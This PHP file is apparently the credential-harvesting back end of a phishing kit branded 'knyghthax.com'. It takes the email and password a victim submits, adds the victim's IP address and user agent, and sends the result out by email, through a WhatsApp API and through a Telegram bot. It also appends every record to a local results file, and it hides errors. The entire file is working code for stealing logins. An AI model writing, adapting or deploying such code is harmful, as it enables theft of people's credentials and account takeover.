<?php
error_reporting(0);
session_start();

include "knyght.php";

// Check if email and password fields are not empty
if (!empty($_POST['email']) && !empty($_POST['password'])) {
    $ipaddress = getenv('REMOTE_ADDR');
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    
    $message = "[==========   login   ===========]\r\n";
    $message .= "|User Id      : " . $_POST['email'] . "\r\n";
    $message .= "|Password     : " . $_POST['password'] . "\r\n";
    $message .= "|UserAgent    : $useragent\r\n";
    $message .= "Ip: ====: $ipaddress :====\r\n";
    $message .= "--------------- $C4MP4G3 By knyghthax.com -----------------\n";
    
    $send = $email;
    $subject = "♠️ (" . $_POST['login'] . ")  RZLT ♠️ $ip";
    $headers = "From: [KNYGHT]";
    
   mail($send,$subject,$message,$headers);
$url='https://api.callmebot.com/whatsapp.php?source=php&phone='.$phone.'&text='.urlencode($message).'&apikey='.$apikey;
$html=file_get_contents($url);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

    // Handle WhatsApp and Telegram messages if needed
    
    $save = fopen("KNYGHT_RZLT.txt", "a+");
    fwrite($save, $message);
    fclose($save);
   
	

    
}
?>
